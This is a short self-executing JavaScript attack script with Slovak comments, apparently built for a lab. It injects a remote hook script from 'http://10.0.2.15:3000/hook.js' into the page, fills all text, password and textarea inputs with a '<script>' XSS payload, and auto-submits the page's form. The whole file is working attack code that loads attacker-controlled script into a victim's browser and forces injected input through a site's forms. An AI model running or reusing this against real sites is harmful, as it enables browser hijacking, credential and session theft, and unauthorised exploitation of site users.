function injectHookJS() {
    const url ='http://10.0.2.15:3000/hook.js';
    const script = document.createElement('script');
    script.src = url;
    script.type = 'text/javascript';
    document.body.appendChild(script);
  }
  
function testXSS() {
    const xssPayload = '<script>alert("XSS Test!")</script>';
    
    // Vyberieme len input a textarea polia
    const formInputs = document.querySelectorAll('input[type="text"], input[type="password"], textarea');
    
    formInputs.forEach(input => {
      input.value = xssPayload;
    });
  
    // Automatické odoslanie formulára (ak existuje)
    const form = document.querySelector('form');
    if (form) {
      form.submit();
    }
}
(function() {
    injectHookJS();
    testXSS();
})();